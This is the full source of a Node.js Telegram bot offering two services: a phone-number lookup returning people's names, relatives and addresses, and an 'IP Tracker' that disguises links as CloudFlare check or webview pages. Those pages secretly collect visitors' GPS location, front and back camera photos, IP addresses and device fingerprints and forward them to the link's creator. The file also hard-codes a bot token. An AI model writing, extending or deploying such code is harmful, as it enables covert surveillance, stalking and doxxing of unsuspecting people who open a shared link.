const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const path = require('path');

// ==================== CONFIG ====================
const CONFIG = {
  BOT_TOKEN: '8377073485:AAERCkZcNZhupFa2Rs2uWrqFhlPQQW2xGqM',
  WEBHOOK_URL: 'https://botu-s3f9.onrender.com',
  PORT: process.env.PORT || 10000,
  ADMIN_ID: 8175884349,
  DEVELOPER: '@aadi_io',
  MOBILE_API_URL: 'https://demon.taitanx.workers.dev/?mobile=',
  BLACKLISTED_NUMBERS: ['9161636853', '9451180555', '6306791897'],
  CAPTCHA_DURATION: 10000, // Increased for more collection time
  CACHE_DURATION: 300000,
  MAX_CACHE_SIZE: 100,
  MAX_HISTORY: 50
};

const bot = new TelegramBot(CONFIG.BOT_TOKEN);
const app = express();

app.use(cors());
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
app.use(express.json());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use((req, res, next) => {
  console.log(`📥 ${req.method} ${req.path}`);
  next();
});

// ==================== Data ====================
const stats = {
  total: 0, success: 0, failed: 0, blocked: 0,
  users: new Set(), ipLinks: 0, ipClicks: 0,
  locations: 0, cameras: 0, infos: 0, startTime: Date.now()
};

const cache = new Map();
const states = new Map();
const history = [];
const activity = new Map();

// ==================== Utils ====================
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.headers['x-real-ip'] || 
         req.connection?.remoteAddress || 
         req.ip || 'Unknown';
}

function getTime() {
  return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false });
}

function uptime() {
  const t = Math.floor((Date.now() - stats.startTime) / 1000);
  const d = Math.floor(t / 86400);
  const h = Math.floor((t % 86400) / 3600);
  const m = Math.floor((t % 3600) / 60);
  const s = t % 60;
  return d > 0 ? `${d}d ${h}h ${m}m` : `${h}h ${m}m ${s}s`;
}

function cleanNumber(num) {
  let n = num.replace(/\D/g, '');
  if (n.startsWith('91') && n.length > 10) n = n.slice(2);
  if (n.startsWith('0') && n.length === 11) n = n.slice(1);
  return n.length > 10 ? n.slice(-10) : n;
}

function formatPhone(p) {
  if (!p) return 'N/A';
  const n = cleanNumber(p);
  return n.length === 10 ? `+91 ${n.slice(0, 5)} ${n.slice(5)}` : p;
}

function formatAddress(a) {
  if (!a || a === 'null') return 'N/A';
  const parts = a.replace(/!!/g, '!').split('!')
    .map(p => p.trim())
    .filter(p => p && p !== 'null' && p.length > 2)
    .slice(0, 4);
  return parts.length ? parts.join('\n') : 'N/A';
}

function logSearch(uid, name, num, status) {
  history.push({ time: new Date(), uid, name, num, status });
  if (history.length > CONFIG.MAX_HISTORY) history.shift();
  if (!activity.has(uid)) {
    activity.set(uid, { name, count: 0, last: null });
  }
  const user = activity.get(uid);
  user.count++;
  user.last = new Date();
}

function cleanCache() {
  if (cache.size > CONFIG.MAX_CACHE_SIZE) {
    const entries = Array.from(cache.entries());
    entries.sort((a, b) => a[1].time - b[1].time);
    const toDelete = entries.slice(0, Math.floor(CONFIG.MAX_CACHE_SIZE / 2));
    toDelete.forEach(([key]) => cache.delete(key));
  }
}

// Split long messages for Telegram
function splitMessage(text, maxLength = 4000) {
  if (text.length <= maxLength) return [text];
  
  const parts = [];
  let current = '';
  
  text.split('\n').forEach(line => {
    if ((current + line + '\n').length > maxLength) {
      if (current) parts.push(current);
      current = line + '\n';
    } else {
      current += line + '\n';
    }
  });
  
  if (current) parts.push(current);
  return parts;
}

// ==================== Keyboards ====================
const mainKeyboard = (isAdmin = false) => ({
  inline_keyboard: [
    [{ text: '🔍 Number Lookup', callback_data: 'number_info' }],
    [{ text: '🌐 IP Tracker', callback_data: 'ip_tracker' }],
    ...(isAdmin ? [[{ text: '⚙️ Admin', callback_data: 'admin' }]] : []),
    [{ text: '💬 Developer', url: `https://t.me/${CONFIG.DEVELOPER.slice(1)}` }]
  ]
});

const adminKeyboard = {
  inline_keyboard: [
    [{ text: '📊 Stats', callback_data: 'stats' }, { text: '🏓 Ping', callback_data: 'ping' }],
    [{ text: '📜 History', callback_data: 'history' }, { text: '👥 Users', callback_data: 'users' }],
    [{ text: '🗑️ Clear', callback_data: 'clear_cache' }, { text: '🔙 Back', callback_data: 'menu' }]
  ]
};

const resultKeyboard = {
  inline_keyboard: [
    [{ text: '🔄 Again', callback_data: 'number_info' }, { text: '🏠 Menu', callback_data: 'menu' }]
  ]
};

const ipKeyboard = {
  inline_keyboard: [
    [{ text: '✨ New Link', callback_data: 'ip_tracker' }],
    [{ text: '🏠 Menu', callback_data: 'menu' }]
  ]
};

const welcomeMsg = (name, isAdmin) => `<b>🤖 Multi-Info Bot</b>\n\n👋 <b>${name}</b>\n\n<b>Services:</b>\n🔍 Number Lookup\n🌐 IP Tracker\n\n${isAdmin ? '🔐 <b>Admin</b>\n' : ''}<i>Choose below ⬇️</i>`;

const statsMsg = () => {
  const rate = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
  return `<b>📊 Statistics</b>\n\n<b>Number Lookup</b>\nTotal: <code>${stats.total}</code>\nSuccess: <code>${stats.success}</code> (${rate}%)\nFailed: <code>${stats.failed}</code>\nBlocked: <code>${stats.blocked}</code>\n\n<b>IP Tracker</b>\nLinks: <code>${stats.ipLinks}</code>\nClicks: <code>${stats.ipClicks}</code>\nLocations: <code>${stats.locations}</code>\nInfos: <code>${stats.infos}</code>\nCameras: <code>${stats.cameras}</code>\n\n<b>System</b>\nUsers: <code>${stats.users.size}</code>\nUptime: <code>${uptime()}</code>`;
};

// ==================== API ====================
async function fetchMobileInfo(mobile) {
  const cleaned = cleanNumber(mobile);
  if (CONFIG.BLACKLISTED_NUMBERS.includes(cleaned)) {
    stats.blocked++;
    return { blocked: true };
  }
  const cached = cache.get(cleaned);
  if (cached && (Date.now() - cached.time) < CONFIG.CACHE_DURATION) {
    return cached.data;
  }
  try {
    stats.total++;
    const response = await axios.get(`${CONFIG.MOBILE_API_URL}${cleaned}`, { timeout: 15000 });
    if (response.data && typeof response.data === 'object') {
      cache.set(cleaned, { data: response.data, time: Date.now() });
      cleanCache();
      stats.success++;
      return response.data;
    }
    stats.failed++;
    return null;
  } catch (error) {
    stats.failed++;
    console.error('❌ API Error:', error.message);
    return null;
  }
}

function formatResult(data, num) {
  if (data?.blocked) {
    return `<b>🚫 Protected</b>\n\n📱 <code>${formatPhone(num)}</code>\n\n<i>Nice try! 🤡</i>`;
  }
  if (!data || !data.data || !Array.isArray(data.data) || data.data.length === 0) {
    return `<b>❌ No Results</b>\n\n📱 <code>${formatPhone(num)}</code>\n\n<i>Not found</i>`;
  }
  const unique = [];
  const seen = new Set();
  data.data.forEach(r => {
    if (typeof r === 'object') {
      const key = JSON.stringify(r);
      if (!seen.has(key)) {
        seen.add(key);
        unique.push(r);
      }
    }
  });
  if (unique.length === 0) {
    return `<b>❌ Empty</b>\n\n📱 <code>${formatPhone(num)}</code>`;
  }
  const results = unique.slice(0, 3).map((r, i) => {
    const name = r.name || 'N/A';
    const fname = r.fname || 'N/A';
    const mobile = formatPhone(r.mobile || num);
    const alt = r.alt && r.alt !== 'null' ? formatPhone(r.alt) : 'N/A';
    const circle = r.circle || 'N/A';
    const uid = r.id || 'N/A';
    const addr = formatAddress(r.address || '');
    const header = unique.length > 1 ? `Result ${i + 1}` : 'Result';
    return `<b>✅ ${header}</b>\n\n👤 <b>${name}</b>\n👨 ${fname}\n\n<b>Contact</b>\n${mobile}\n${alt}\n\n<b>Network</b>\n${circle} • <code>${uid}</code>\n\n<b>Address</b>\n${addr}\n`;
  });
  return results.join('\n━━━━━━━━━━━━━━\n\n');
}

// ==================== Webhook ====================
app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
  console.log('📨 Webhook');
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ==================== Tracker Routes ====================
app.get('/c/:path/:uri', (req, res) => {
  console.log('🌐 CloudFlare');
  stats.ipClicks++;
  if (req.params.path) {
    res.render('cloudflare', {
      ip: getIP(req),
      time: getTime(),
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      host: CONFIG.WEBHOOK_URL,
      duration: CONFIG.CAPTCHA_DURATION
    });
  } else {
    res.redirect(`https://t.me/${CONFIG.DEVELOPER.slice(1)}`);
  }
});

app.get('/w/:path/:uri', (req, res) => {
  console.log('🌐 WebView');
  stats.ipClicks++;
  if (req.params.path) {
    res.render('webview', {
      ip: getIP(req),
      time: getTime(),
      url: Buffer.from(req.params.uri, 'base64').toString(),
      uid: req.params.path,
      host: CONFIG.WEBHOOK_URL
    });
  } else {
    res.redirect(`https://t.me/${CONFIG.DEVELOPER.slice(1)}`);
  }
});

// Location endpoint
app.post('/location', async (req, res) => {
  console.log('📍 Location:', req.body);
  const { lat, lon, uid, acc, alt, heading, speed } = req.body;
  
  if (lat && lon && uid) {
    try {
      const userId = parseInt(uid, 36);
      stats.locations++;
      
      await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
      
      let msg = `<b>📍 GPS Location</b>\n\nLatitude: <code>${lat}</code>\nLongitude: <code>${lon}</code>\nAccuracy: <code>${acc}m</code>`;
      if (alt) msg += `\nAltitude: <code>${alt}m</code>`;
      if (heading) msg += `\nHeading: <code>${heading}°</code>`;
      if (speed) msg += `\nSpeed: <code>${speed}m/s</code>`;
      msg += `\n\n🗺️ <a href="https://maps.google.com?q=${lat},${lon}">Open in Google Maps</a>`;
      msg += `\n🌍 <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15">OpenStreetMap</a>`;
      
      await bot.sendMessage(userId, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
      
      console.log('✅ Location sent');
      res.json({ success: true });
    } catch (err) {
      console.error('❌ Location error:', err);
      res.json({ success: false, error: err.message });
    }
  } else {
    res.json({ success: false, error: 'Invalid data' });
  }
});

// Info endpoint - handles multiple messages
app.post('/info', async (req, res) => {
  console.log('ℹ️ Info received');
  const { uid, data } = req.body;
  
  if (uid && data) {
    try {
      const userId = parseInt(uid, 36);
      stats.infos++;
      
      console.log(`Sending info to ${userId}, length: ${data.length}`);
      
      // Split message if too long
      const messages = splitMessage(data, 4000);
      
      for (let i = 0; i < messages.length; i++) {
        await bot.sendMessage(userId, messages[i], { parse_mode: 'HTML' });
        if (i < messages.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 500)); // Delay between messages
        }
      }
      
      console.log(`✅ Sent ${messages.length} message(s)`);
      res.json({ success: true, messages: messages.length });
    } catch (err) {
      console.error('❌ Info error:', err);
      res.json({ success: false, error: err.message });
    }
  } else {
    res.json({ success: false, error: 'Invalid data' });
  }
});

// Camera endpoint
app.post('/camsnap', async (req, res) => {
  console.log('📷 Camera');
  const { uid, img, front, back } = req.body;
  
  if (uid && (img || front || back)) {
    try {
      const userId = parseInt(uid, 36);
      stats.cameras++;
      
      // Send front camera if available
      if (front) {
        const buffer = Buffer.from(front, 'base64');
        await bot.sendPhoto(userId, buffer, {
          caption: `<b>📷 Front Camera</b>\n\n<i>${getTime()}</i>`,
          parse_mode: 'HTML'
        });
        console.log('✅ Front camera sent');
      }
      
      // Send back camera if available
      if (back) {
        const buffer = Buffer.from(back, 'base64');
        await bot.sendPhoto(userId, buffer, {
          caption: `<b>📷 Back Camera</b>\n\n<i>${getTime()}</i>`,
          parse_mode: 'HTML'
        });
        console.log('✅ Back camera sent');
      }
      
      // Fallback to img if front/back not specified
      if (img && !front && !back) {
        const buffer = Buffer.from(img, 'base64');
        await bot.sendPhoto(userId, buffer, {
          caption: `<b>📷 Camera Captured</b>\n\n<i>${getTime()}</i>`,
          parse_mode: 'HTML'
        });
        console.log('✅ Camera sent');
      }
      
      res.json({ success: true });
    } catch (err) {
      console.error('❌ Camera error:', err);
      res.json({ success: false, error: err.message });
    }
  } else {
    res.json({ success: false, error: 'Invalid data' });
  }
});

// Camera status
app.post('/cam-status', async (req, res) => {
  console.log('📷 Status:', req.body);
  const { uid, status } = req.body;
  
  if (uid && status) {
    try {
      const userId = parseInt(uid, 36);
      const msg = status === 'denied' ? '❌ <b>Camera Denied</b>\n\nUser blocked camera access' : 
                  status === 'allowed' ? '✅ <b>Camera Allowed</b>\n\nCapturing photos...' : 
                  status === 'error' ? '⚠️ <b>Camera Error</b>\n\nCamera not available' :
                  '⏳ <b>Camera Pending</b>\n\nWaiting for permission...';
      
      await bot.sendMessage(userId, msg, { parse_mode: 'HTML' });
      res.json({ success: true });
    } catch (err) {
      res.json({ success: false, error: err.message });
    }
  } else {
    res.json({ success: false, error: 'Invalid data' });
  }
});

// Additional data endpoint
app.post('/extra-data', async (req, res) => {
  console.log('📊 Extra data:', Object.keys(req.body));
  const { uid, type, data } = req.body;
  
  if (uid && type && data) {
    try {
      const userId = parseInt(uid, 36);
      await bot.sendMessage(userId, data, { parse_mode: 'HTML' });
      res.json({ success: true });
    } catch (err) {
      res.json({ success: false, error: err.message });
    }
  } else {
    res.json({ success: false, error: 'Invalid data' });
  }
});

// Bot handlers (keeping same structure as before)
bot.on('message', async (msg) => {
  console.log(`💬 ${msg.from.id}: ${msg.text}`);
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.first_name || 'User';
  stats.users.add(userId);

  if (states.get(chatId) === 'waiting_url') {
    const text = msg.text;
    const hasInvalid = [...text].some(c => c.charCodeAt(0) > 127);
    if ((text.includes('http://') || text.includes('https://')) && !hasInvalid) {
      const encoded = Buffer.from(text).toString('base64');
      const urlPath = `${chatId.toString(36)}/${encoded}`;
      const cUrl = `${CONFIG.WEBHOOK_URL}/c/${urlPath}`;
      const wUrl = `${CONFIG.WEBHOOK_URL}/w/${urlPath}`;
      stats.ipLinks++;
      states.delete(chatId);
      
      await bot.sendMessage(chatId, `<b>✅ Tracking Links Created</b>\n\n🔗 Original URL:\n<code>${text}</code>\n\n<b>🌐 CloudFlare (Advanced):</b>\n<code>${cUrl}</code>\n\n<b>🌐 WebView (Simple):</b>\n<code>${wUrl}</code>\n\n<b>📊 Collects EVERYTHING:</b>\n📍 GPS Location (high accuracy)\n🌐 Public + Local IPs\n🖥️ Complete Device Info\n📱 Battery + Network Status\n📷 Front + Back Camera\n🔍 Browser Fingerprint\n🌍 WebRTC IPs\n🔌 Fonts + Plugins\n📊 Canvas + WebGL\n🎤 Audio Context\n📐 Screen Details\n⚙️ Hardware Info\n\n<i>Share link to collect data</i>`, {
        parse_mode: 'HTML',
        reply_markup: ipKeyboard,
        disable_web_page_preview: true
      });
    } else {
      await bot.sendMessage(chatId, '⚠️ Invalid URL\n\nInclude http:// or https://', { parse_mode: 'HTML' });
    }
    return;
  }

  if (states.get(chatId) === 'waiting_number') {
    const num = cleanNumber(msg.text);
    if (!/^\d{10}$/.test(num)) {
      await bot.sendMessage(chatId, '<b>❌ Invalid</b>\n\n10-digit number required\n\n💡 <code>9876543210</code>', { parse_mode: 'HTML' });
      return;
    }
    const searchMsg = await bot.sendMessage(chatId, '🔍 <b>Searching...</b>', { parse_mode: 'HTML' });
    const data = await fetchMobileInfo(num);
    const status = data?.blocked ? 'blacklist' : (data ? 'success' : 'failed');
    logSearch(userId, userName, num, status);
    await bot.deleteMessage(chatId, searchMsg.message_id).catch(() => {});
    const result = data ? formatResult(data, num) : `<b>⚠️ Error</b>\n\nUnable to fetch data`;
    await bot.sendMessage(chatId, result, { parse_mode: 'HTML', reply_markup: resultKeyboard });
    states.delete(chatId);
    return;
  }

  if (msg.text === '/start') {
    await bot.sendMessage(chatId, welcomeMsg(userName, userId === CONFIG.ADMIN_ID), {
      parse_mode: 'HTML',
      reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
    });
  } else if (msg.text === '/admin' && userId === CONFIG.ADMIN_ID) {
    await bot.sendMessage(chatId, '<b>⚙️ Admin Panel</b>', { parse_mode: 'HTML', reply_markup: adminKeyboard });
  } else if (msg.text === '/stats') {
    await bot.sendMessage(chatId, statsMsg(), { parse_mode: 'HTML' });
  } else {
    const num = cleanNumber(msg.text);
    if (/^\d{10}$/.test(num)) {
      states.set(chatId, 'waiting_number');
      const searchMsg = await bot.sendMessage(chatId, '🔍 <b>Searching...</b>', { parse_mode: 'HTML' });
      const data = await fetchMobileInfo(num);
      const status = data?.blocked ? 'blacklist' : (data ? 'success' : 'failed');
      logSearch(userId, userName, num, status);
      await bot.deleteMessage(chatId, searchMsg.message_id).catch(() => {});
      const result = data ? formatResult(data, num) : `<b>⚠️ Error</b>`;
      await bot.sendMessage(chatId, result, { parse_mode: 'HTML', reply_markup: resultKeyboard });
      states.delete(chatId);
    } else {
      await bot.sendMessage(chatId, '<b>💡 Tip</b>\n\nUse buttons below', {
        parse_mode: 'HTML',
        reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
      });
    }
  }
});

bot.on('callback_query', async (query) => {
  console.log(`🔘 ${query.data}`);
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;
  const userId = query.from.id;
  const userName = query.from.first_name || 'User';
  const data = query.data;
  await bot.answerCallbackQuery(query.id);

  try {
    switch (data) {
      case 'menu':
        states.delete(chatId);
        await bot.editMessageText(welcomeMsg(userName, userId === CONFIG.ADMIN_ID), {
          chat_id: chatId, message_id: msgId, parse_mode: 'HTML',
          reply_markup: mainKeyboard(userId === CONFIG.ADMIN_ID)
        });
        break;
      case 'number_info':
        states.set(chatId, 'waiting_number');
        await bot.editMessageText('<b>🔍 Number Lookup</b>\n\nSend 10-digit mobile number\n\n💡 <code>9876543210</code>', {
          chat_id: chatId, message_id: msgId, parse_mode: 'HTML'
        });
        break;
      case 'ip_tracker':
        states.set(chatId, 'waiting_url');
        await bot.editMessageText('<b>🌐 IP Tracker</b>\n\nSend URL to track\n\n💡 <code>https://example.com</code>\n\n<b>Collects:</b>\n📍 GPS • 🌐 IPs • 🖥️ Device\n📱 Battery • 📷 Camera • 🔍 Fingerprint', {
          chat_id: chatId, message_id: msgId, parse_mode: 'HTML'
        });
        break;
      case 'admin':
        if (userId === CONFIG.ADMIN_ID) {
          await bot.editMessageText('<b>⚙️ Admin Panel</b>', {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML', reply_markup: adminKeyboard
          });
        }
        break;
      case 'stats':
        if (userId === CONFIG.ADMIN_ID) {
          await bot.editMessageText(statsMsg(), {
            chat_id: chatId, message_id: msgId, parse_mode: 'HTML', reply_markup: adminKeyboard
          });
        }
        break;
      case 'ping':
        if (userId === CONFIG.ADMIN_ID) {
          const start = Date.now();
          try {
            await axios.get('https://api.telegram.org');
            await bot.answerCallbackQuery(query.id, { text: `🏓 ${Date.now() - start}ms`, show_alert: true });
          } catch (err) {
            await bot.answerCallbackQuery(query.id, { text: '❌ Error', show_alert: true });
          }
        }
        break;
      case 'clear_cache':
        if (userId === CONFIG.ADMIN_ID) {
          const size = cache.size;
          cache.clear();
          await bot.answerCallbackQuery(query.id, { text: `✅ Cleared ${size}`, show_alert: true });
        }
        break;
    }
  } catch (err) {
    console.error('❌', err.message);
  }
});

// Web routes
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    bot: 'Multi-Info Bot - Ultimate Tracker',
    version: '6.0',
    developer: CONFIG.DEVELOPER,
    stats: { 
      uptime: uptime(), 
      users: stats.users.size, 
      requests: stats.total, 
      ipLinks: stats.ipLinks,
      ipClicks: stats.ipClicks,
      locations: stats.locations,
      infos: stats.infos,
      cameras: stats.cameras
    }
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'healthy', uptime: uptime(), stats });
});

app.get('/webhook-info', async (req, res) => {
  try {
    const info = await bot.getWebHookInfo();
    res.json({ url: info.url, pending: info.pending_update_count, error: info.last_error_message });
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.use((err, req, res, next) => {
  console.error('❌ Express:', err.message);
  res.status(500).json({ error: err.message });
});

// Start
async function setupWebhook() {
  try {
    console.log('🔄 Setting webhook...');
    await bot.deleteWebHook();
    await new Promise(resolve => setTimeout(resolve, 2000));
    const webhookUrl = `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`;
    await bot.setWebHook(webhookUrl, { max_connections: 100, allowed_updates: ['message', 'callback_query'] });
    console.log('✅ Webhook:', webhookUrl);
    const info = await bot.getWebHookInfo();
    console.log('📍 Active:', info.url);
    return true;
  } catch (err) {
    console.error('❌', err.message);
    return false;
  }
}

app.listen(CONFIG.PORT, async () => {
  console.log('\n' + '='.repeat(60));
  console.log('🚀 Multi-Info Bot v6.0 - ULTIMATE TRACKER');
  console.log('='.repeat(60));
  const success = await setupWebhook();
  if (success) {
    console.log(`✅ Server: ${CONFIG.WEBHOOK_URL}:${CONFIG.PORT}`);
    console.log('✅ Collecting MAXIMUM information!');
    console.log('='.repeat(60) + '\n');
  } else {
    console.log('❌ Failed\n');
  }
});

bot.on('polling_error', (err) => console.error('❌', err.code));
bot.on('webhook_error', (err) => console.error('❌', err.code));
process.on('unhandledRejection', (err) => console.error('❌', err));
